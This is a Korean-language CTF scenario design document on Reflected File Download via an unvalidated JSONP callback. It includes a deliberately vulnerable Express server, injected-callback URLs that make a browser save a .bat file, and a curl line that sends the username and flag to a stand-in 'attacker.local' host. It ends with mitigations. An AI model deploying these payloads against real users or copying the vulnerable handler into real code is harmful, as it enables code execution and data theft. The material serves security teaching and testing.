---
title: Reflected File Download (RFD) via JSONP Callback — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, rfd, reflected-file-download, jsonp, callback-injection, client-side, social-engineering]
confidence: high
---

# Reflected File Download (RFD) via JSONP Callback — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: API Hub Downloader (API 허브 파일 추출기)
- **난이도**: Medium-High
- **핵심 컨셉**: 웹 API 응답 처리 구조의 허점과 브라우저의 파일 다운로드 메커니즘을 결합하여 피해자의 로컬 PC 권한을 장악해 나가는 **Reflected File Download (RFD)** 취약점 문제입니다. 대상 애플리케이션은 교차 출처 리소스 공유 및 프론트엔드 연동을 위해 **JSONP** 포맷의 응답 API를 제공합니다. 이때 API 엔드포인트는 사용자가 입력한 `callback` 파라미터 값을 브라우저 응답 헤더의 안전장치 없이 응답 본문에 그대로 출력합니다. 공격자는 URL 경로 및 쿼리 파라미터를 정교하게 가공하여, 피해자의 브라우저가 해당 API 호출 시 JSON 데이터를 다운로드하는 대신 실행 가능한 윈도우 배치 스크립트(`.bat` 또는 `.cmd`) 파일 형식으로 자동 인지 및 저장하도록 유도하고, 사용자가 다운로드된 파일을 직접 구동하게 만들어 PC 통제권을 강탈합니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **JSONP API Service (`/api/v1/user/search.jsonp`)**:
  - 사용자 목록을 JSON 데이터로 돌려주며, `callback` 파라미터가 명시되면 `callback_val({"id":1...})` 포맷으로 렌더링.
- **Flag 위치**:
  - 피해자(Admin Bot)의 로컬 컴퓨터 내 특정 경로에 플래그가 저장되어 있거나, RFD 다운로드 스크립트가 실행될 때 피해자 내부 네트워크 관리 콘솔에 명령어를 주입하여 획득할 수 있는 플래그.

### 2.2 취약점 지점
1. **Reflected Callback Input (콜백 입력값 미검증)**:
   - 사용자가 전송한 `callback` 값이 알파벳/숫자로만 이루어졌는지 확인하지 않고 특수 문자 및 개행 코드를 그대로 응답 본문에 인쇄합니다.
2. **Missing Content-Disposition & Incorrect Content-Type**:
   - 서버 응답 헤더에 `Content-Type: application/json` 혹은 `text/html`이 사용되고, `Content-Disposition` 헤더에 의한 파일명 고정 제어가 누락되었습니다.
   - 브라우저는 URL 경로의 끝부분 확장자(예: `/search.jsonp/setup.bat`)를 인식하여 다운로드되는 파일의 이름을 강제로 배치 파일(`.bat`) 형식으로 매핑하려는 성질이 작동합니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 파라미터 | 반환 헤더 허점 | 역할 |
|------------|--------|------|----------|----------------|------|
| `/api/v1/user/search.jsonp` | GET | 불필요 | `callback`, `q` | `Content-Disposition` 누락 | JSONP API 및 RFD 다운로드 유발점 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. JSONP API 응답 특성 진단
1. 공격자는 JSONP 검색 엔드포인트에 쿼리를 전송합니다.
   `GET /api/v1/user/search.jsonp?callback=myCallback`
2. 반환되는 HTTP 응답 구조를 분석합니다.
   - **반환 Response**:
     ```http
     HTTP/1.1 200 OK
     Content-Type: text/plain; charset=utf-8
     
     myCallback({"status":"success","data":[]})
     ```
3. `callback` 값 검증 필터 및 헤더 제한이 부실하여 이 영역에 세미콜론이나 시스템 명령어 구조를 인젝션할 수 있음을 진단합니다.

### Step 2. URL 경로 조작 및 파일명 강제 (Path Parameter Abuse)
브라우저가 응답 스트림을 다운로드 파일로 인식하게 만들기 위해 URL 끝 부분에 원하는 파일 명칭과 실행 확장자를 덧붙여 요청을 가동합니다.
- **조작된 URL 구조**:
  `http://api.challenge.local/api/v1/user/search.jsonp/setup.bat?callback=...`
  *(일부 모던 웹 프레임워크는 라우팅 패턴 분석 시 뒤의 슬래시 이후 문자열을 무시하거나 경로 변수로 파싱하므로, 실제 백엔드 컨트롤러는 정상 동작하면서 브라우저는 `setup.bat` 파일 다운로드로 판별함)*

### Step 3. 배치 파일 명령어 주입 페이로드 설계
`callback` 파라미터 내부에 윈도우 배치 커맨드가 실행될 수 있도록 개행(`%0a`)과 주석 기호, 쉘 실행 명령어를 합성합니다.
- **주입용 Callback 값**:
  `%0astart%20calc.exe%20%26%20rem%20`
  *(실제 쉘 상에서 동작할 공격 페이로드: `%0acurl http://attacker.local/log?c=%25username%25 %26 rem `)*
- **실제 응답 본문 조합 형상**:
  ```batch
  
  curl http://attacker.local/log?c=%username% & rem ({"status":"success","data":[]})
  ```
  이 코드는 배치 파일(`.bat`)로 저장되었을 때 첫 줄의 개행 이후 두 번째 줄의 `curl` 명령어가 정상 동작하고, 뒤의 JSON 데이터는 `& rem` (주석) 처리가 되어 쉘 문법 에러 없이 완벽히 구동됩니다.

### Step 4. 피해자 유도 및 flag 획득
1. 공격자는 완성된 RFD 다운로드 트리거 주소를 관리자 봇에게 송신합니다.
   `http://api.challenge.local/api/v1/user/search.jsonp/setup.bat?callback=%0acurl%20http://attacker.local/log?f%3DFLAG_REPLACE%20%26%20rem%20`
2. 봇의 브라우저는 해당 API를 호출하며 `setup.bat` 파일을 내려받게 되며, 사회공학적 기법에 노출된 피해자가 해당 파일을 실행하면 주입된 시스템 명령어가 실행됩니다.
3. 봇의 로컬 환경 단에서 유출 명령이 실행되어 플래그 데이터(`FLAG{reflected_file_download_jsonp_rfd_exploit}`)가 공격자 서버로 송출됩니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Node.js Express)

```javascript
// server.js (취약한 JSONP API 제공 Express 서버 예시)
const express = require('express');
const app = express();

// 취약점 지점 1: 라우터가 와일드카드나 추가 경로 문자열(/*)을 허용하여 
// 브라우저가 URL 끝부분의 확장자(.bat)를 다운로드 파일명으로 착각하게 만듬
app.get('/api/v1/user/search.jsonp*', (req, res) => {
    const callback = req.query.callback || 'callback';
    const responseData = { status: "success", users: [] };

    // 취약점 지점 2: callback 입력값에 대해 메타 문자나 개행 문자(\r\n) 필터링이 누락됨
    // 취약점 지점 3: Content-Disposition 헤더를 강제하지 않아 브라우저가 경로 상의 파일명으로 저장을 시도함
    res.setHeader('Content-Type', 'text/plain'); // 혹은 application/javascript
    
    // 응답 출력
    res.send(`${callback}(${JSON.stringify(responseData)});`);
});

app.listen(8080);
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **`Content-Disposition` 헤더 고정 강제 (Use Content-Disposition Header)**:
   - JSONP 및 API 응답 전송 시 브라우저가 임의로 파일 저장을 시도하는 행위를 차단하기 위해 `Content-Disposition` 헤더를 통해 고정된 안전 파일명을 선언해 둡니다.
     ```javascript
     res.setHeader('Content-Disposition', 'attachment; filename="response.json"');
     ```
2. **`callback` 파라미터 화이트리스트 정제**:
   - `callback` 입력값에 알파벳, 숫자, 밑줄, 점(`^[a-zA-Z0-9_\.]+$`) 이외의 특수기호나 개행 코드가 들어오면 API 동작을 즉각 반려 처리합니다.
3. **`X-Content-Type-Options: nosniff` 헤더 선언**:
   - 브라우저가 MIME 타입을 임의로 추측(Sniffing)하여 스크립트나 실행 파일로 해석하려는 시도를 무력화하도록 HTTP 보안 헤더를 강제 설정합니다.
     ```http
     X-Content-Type-Options: nosniff
     ```
